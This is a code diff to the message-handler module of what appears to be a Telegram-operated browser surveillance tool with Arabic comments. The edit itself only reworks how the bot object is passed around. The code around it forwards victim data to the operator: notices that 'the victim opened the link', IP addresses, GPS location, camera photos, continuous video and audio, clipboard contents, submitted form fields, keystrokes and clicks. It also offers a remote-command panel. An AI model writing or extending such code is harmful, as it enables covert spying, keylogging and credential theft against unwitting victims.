@@ -1,6 +1,6 @@
 # lsh/handlers.py
 # ============================================================
-# معالجة الرسائل v6 — مع Logging شامل
+# معالجة الرسائل v6 — مع Logging شامل + إصلاح bot reference
 # ============================================================
 
 import io
@@ -30,7 +30,16 @@ def set_bot_reference(bot):
     """ربط البوت"""
     global _BOT_REF
     _BOT_REF = bot
-    logger.info("✅ Bot reference set for LSH handlers")
+    logger.info("✅ [LSH] Bot reference set")
+
+
+def _get_bot(bot=None):
+    """يرجع الـ bot — بيدور على أي متاح"""
+    if bot is not None:
+        return bot
+    if _BOT_REF is not None:
+        return _BOT_REF
+    return None
 
 
 # ============================================================
@@ -38,38 +47,44 @@ def set_bot_reference(bot):
 # ============================================================
 def _safe_send(bot, chat_id, text, **kwargs):
     """يرسل رسالة بشكل آمن مع logging"""
-    if not bot:
-        logger.error(f"❌ No bot instance for chat_id={chat_id}")
+    actual_bot = _get_bot(bot)
+
+    if not actual_bot:
+        logger.error(f"❌ [SAFE SEND] No bot instance! chat_id={chat_id}")
         return False
 
     if not chat_id:
-        logger.error(f"❌ Empty chat_id")
+        logger.error(f"❌ [SAFE SEND] Empty chat_id")
         return False
 
     try:
         # نظّف chat_id
         chat_id_str = str(chat_id).strip()
 
+        if not chat_id_str:
+            logger.error(f"❌ [SAFE SEND] Empty chat_id after strip")
+            return False
+
         # حوّل لـ int لو ممكن
         cid = int(chat_id_str) if chat_id_str.isdigit() else chat_id_str
 
-        logger.info(f"📤 Sending to chat_id={cid} | text={text[:80]}")
+        logger.info(f"📤 [SAFE SEND] → chat_id={cid} | text={text[:60]}...")
 
-        result = bot.send_message(cid, text, **kwargs)
-        logger.info(f"✅ Sent to {cid} successfully")
+        result = actual_bot.send_message(cid, text, **kwargs)
+        logger.info(f"✅ [SAFE SEND] Success to {cid} (msg_id={result.message_id})")
         return True
 
     except Exception as e:
         error_msg = str(e)
 
         if "Forbidden" in error_msg or "blocked" in error_msg:
-            logger.error(f"❌ FORBIDDEN: User {chat_id} hasn't started the bot or blocked it")
+            logger.error(f"❌ [SAFE SEND] FORBIDDEN: User {chat_id} hasn't started the bot or blocked it")
         elif "chat not found" in error_msg.lower():
-            logger.error(f"❌ CHAT NOT FOUND: {chat_id}")
+            logger.error(f"❌ [SAFE SEND] CHAT NOT FOUND: {chat_id}")
         elif "bad request" in error_msg.lower():
-            logger.error(f"❌ BAD REQUEST for {chat_id}: {error_msg}")
+            logger.error(f"❌ [SAFE SEND] BAD REQUEST for {chat_id}: {error_msg}")
         else:
-            logger.exception(f"❌ send_message error: {e}")
+            logger.exception(f"❌ [SAFE SEND] error for {chat_id}: {e}")
 
         return False
 
@@ -80,15 +95,22 @@ def _safe_send(bot, chat_id, text, **kwargs):
 def _handle_incoming(bot, chat_id, session_id, data, source_ip):
     dtype = data.get('type')
 
-    logger.info(f"🔔 [HANDLE] dtype={dtype} | session={session_id[:8] if session_id else 'None'} | chat_id={chat_id} (type={type(chat_id).__name__})")
+    # ★ استخدام bot الفعلي
+    actual_bot = _get_bot(bot)
 
-    if not _BOT_REF:
-        logger.error("❌ _BOT_REF is None! Bot not set. Call set_bot_reference() first.")
+    logger.info(
+        f"🔔 [HANDLE] dtype={dtype} | "
+        f"session={session_id[:8] if session_id else 'None'} | "
+        f"chat_id={chat_id} (type={type(chat_id).__name__}) | "
+        f"bot_set={actual_bot is not None}"
+    )
+
+    if not actual_bot:
+        logger.error("❌ [HANDLE] No bot instance available! Cannot send messages.")
         return
 
-    # ★ تأكد من chat_id
     if not chat_id:
-        logger.error(f"❌ chat_id is empty in _handle_incoming")
+        logger.error(f"❌ [HANDLE] chat_id is empty")
         return
 
     try:
@@ -116,12 +138,12 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             return
 
         # ═══════════════════════════════════════════════════
-        # Events — الأحداث اللي بتروح للمستخدم
+        # Events
         # ═══════════════════════════════════════════════════
         if dtype == 'landing':
-            logger.info(f"🎯 LANDING event — sending to {chat_id}")
+            logger.info(f"🎯 [HANDLE] LANDING — sending to {chat_id}")
             _safe_send(
-                _BOT_REF, chat_id,
+                actual_bot, chat_id,
                 f"🎯 <b>الضحية فتح الرابط!</b>\n"
                 f"🆔 <code>{session_id}</code>\n"
                 f"🌐 IP: <code>{source_ip}</code>\n\n"
@@ -131,7 +153,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
 
         elif dtype == 'retry_click':
             _safe_send(
-                _BOT_REF, chat_id,
+                actual_bot, chat_id,
                 f"👆 <b>الضحية ضغط على إعادة المحاولة!</b>\n🆔 <code>{session_id}</code>",
                 parse_mode="HTML"
             )
@@ -139,14 +161,14 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
         elif dtype == 'page_visible':
             update_session(session_id, page_status="visible")
             _safe_send(
-                _BOT_REF, chat_id,
+                actual_bot, chat_id,
                 f"👁️ <b>الضحية فتح الصفحة!</b>\n🆔 <code>{session_id}</code>",
                 parse_mode="HTML"
             )
 
         elif dtype == 'page_unload':
             _safe_send(
-                _BOT_REF, chat_id,
+                actual_bot, chat_id,
                 f"🚪 <b>الضحية يحاول إغلاق الصفحة!</b>\n🆔 <code>{session_id}</code>",
                 parse_mode="HTML"
             )
@@ -154,7 +176,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
         elif dtype == 'manual_reconnect':
             update_session(session_id, reconnect_count=0)
             _safe_send(
-                _BOT_REF, chat_id,
+                actual_bot, chat_id,
                 f"🔄 <b>إعادة اتصال يدوية</b> — <code>{session_id[:8]}</code>",
                 parse_mode="HTML"
             )
@@ -171,7 +193,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             panel = build_lsh_control_panel(session_id, chat_id)
 
             _safe_send(
-                _BOT_REF, chat_id,
+                actual_bot, chat_id,
                 f"✅ <b>الجلسة <code>{session_id[:8]}</code> جاهزة للتحكم الكامل</b>\n"
                 f"استخدم اللوحة أدناه 👇",
                 parse_mode="HTML",
@@ -187,7 +209,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             update_session(session_id, info=info)
             text = _format_info_report(info, session_id)
             _safe_send(
-                _BOT_REF, chat_id,
+                actual_bot, chat_id,
                 text,
                 parse_mode="HTML",
                 disable_web_page_preview=True
@@ -198,7 +220,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             if loc and loc.get('latitude'):
                 lat, lng = loc['latitude'], loc['longitude']
                 _safe_send(
-                    _BOT_REF, chat_id,
+                    actual_bot, chat_id,
                     f"📍 <b>الموقع:</b> <code>{lat}, {lng}</code>\n"
                     f'<a href="https://maps.google.com/?q={lat},{lng}">🗺️ خرائط</a>',
                     parse_mode="HTML"
@@ -209,7 +231,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             if loc and loc.get('latitude'):
                 lat, lng = loc['latitude'], loc['longitude']
                 _safe_send(
-                    _BOT_REF, chat_id,
+                    actual_bot, chat_id,
                     f"📍 <b>تحديث موقع:</b> <code>{lat}, {lng}</code>",
                     parse_mode="HTML"
                 )
@@ -218,19 +240,19 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
         # Media
         # ═══════════════════════════════════════════════════
         elif dtype == 'first_photo':
-            _send_photo(_BOT_REF, chat_id, data.get('image', ''), "📸 <b>صورة أولية</b>")
+            _send_photo(actual_bot, chat_id, data.get('image', ''), "📸 <b>صورة أولية</b>")
 
         elif dtype == 'first_audio':
-            _send_audio(_BOT_REF, chat_id, data.get('audio', ''), "🎙️ <b>تسجيل صوتي أولي</b>")
+            _send_audio(actual_bot, chat_id, data.get('audio', ''), "🎙️ <b>تسجيل صوتي أولي</b>")
 
         elif dtype == 'periodic_photo':
-            _send_photo(_BOT_REF, chat_id, data.get('image', ''), "📸 <b>صورة دورية</b>")
+            _send_photo(actual_bot, chat_id, data.get('image', ''), "📸 <b>صورة دورية</b>")
 
         elif dtype == 'continuous_video_chunk':
-            _send_video(_BOT_REF, chat_id, data.get('data', ''), "📹 <b>فيديو مستمر</b>")
+            _send_video(actual_bot, chat_id, data.get('data', ''), "📹 <b>فيديو مستمر</b>")
 
         elif dtype == 'always_audio_chunk':
-            _send_audio(_BOT_REF, chat_id, data.get('data', ''), "🎤 <b>مقطع صوتي دائم</b>")
+            _send_audio(actual_bot, chat_id, data.get('data', ''), "🎤 <b>مقطع صوتي دائم</b>")
 
         # ═══════════════════════════════════════════════════
         # Command Results
@@ -245,11 +267,11 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             if status == 'ok':
                 if cmd_id:
                     ack_command(session_id, cmd_id)
-                _handle_cmd_success(_BOT_REF, chat_id, action, result)
+                _handle_cmd_success(actual_bot, chat_id, action, result)
             else:
                 if cmd_id:
                     nack_command(session_id, cmd_id, error[:100])
-                _handle_cmd_failure(_BOT_REF, chat_id, action, error)
+                _handle_cmd_failure(actual_bot, chat_id, action, error)
 
         # ═══════════════════════════════════════════════════
         # Monitors
@@ -266,7 +288,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             c = data.get('content', '')
             if c:
                 _safe_send(
-                    _BOT_REF, chat_id,
+                    actual_bot, chat_id,
                     f"📋 <b>نسخ:</b>\n<pre>{c[:300]}</pre>",
                     parse_mode="HTML"
                 )
@@ -275,7 +297,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             c = data.get('content', '')
             if c:
                 _safe_send(
-                    _BOT_REF, chat_id,
+                    actual_bot, chat_id,
                     f"📥 <b>لصق:</b>\n<pre>{c[:300]}</pre>",
                     parse_mode="HTML"
                 )
@@ -288,7 +310,7 @@ def _handle_incoming(bot, chat_id, session_id, data, source_ip):
             ]
             for k, v in list(form_data.items())[:20]:
                 lines.append(f"• <code>{k}</code>: <code>{str(v)[:100]}</code>")
-            _safe_send(_BOT_REF, chat_id, "\n".join(lines), parse_mode="HTML")
+            _safe_send(actual_bot, chat_id, "\n".join(lines), parse_mode="HTML")
 
         elif dtype == 'click':
             txt = (data.get('text') or '').strip()
@@ -486,12 +508,14 @@ def _accumulate_key(chat_id, session_id, key):
     buf["text"] += display
 
     if now - buf["last"] > 4 or len(buf["text"]) > 180:
-        if buf["text"].strip() and _BOT_REF:
-            _safe_send(
-                _BOT_REF, chat_id,
-                f"⌨️ <b>لوحة المفاتيح:</b>\n<pre>{buf['text'][:500]}</pre>",
-                parse_mode="HTML"
-            )
+        if buf["text"].strip():
+            bot = _get_bot()
+            if bot:
+                _safe_send(
+                    bot, chat_id,
+                    f"⌨️ <b>لوحة المفاتيح:</b>\n<pre>{buf['text'][:500]}</pre>",
+                    parse_mode="HTML"
+                )
         buf["text"] = ""
         buf["last"] = now
 
@@ -502,10 +526,11 @@ def _accumulate_click(chat_id, session_id, text):
     buf["texts"].append(text)
 
     if now - buf["last"] > 6 or len(buf["texts"]) >= 8:
-        if _BOT_REF and buf["texts"]:
+        bot = _get_bot()
+        if bot and buf["texts"]:
             unique = list(dict.fromkeys(buf["texts"]))[:8]
             _safe_send(
-                _BOT_REF, chat_id,
+                bot, chat_id,
                 "🖱️ <b>النقرات:</b>\n" + "\n".join(f"• {t[:70]}" for t in unique),
                 parse_mode="HTML"
             )
@@ -570,4 +595,4 @@ def _format_info_report(info, session_id):
         f"⚙️ Service Worker: {sw_status}\n"
         f"💡 Wake Lock: {wl_status}\n"
         f"📱 PWA: {pwa_status}"
-                )
+    )
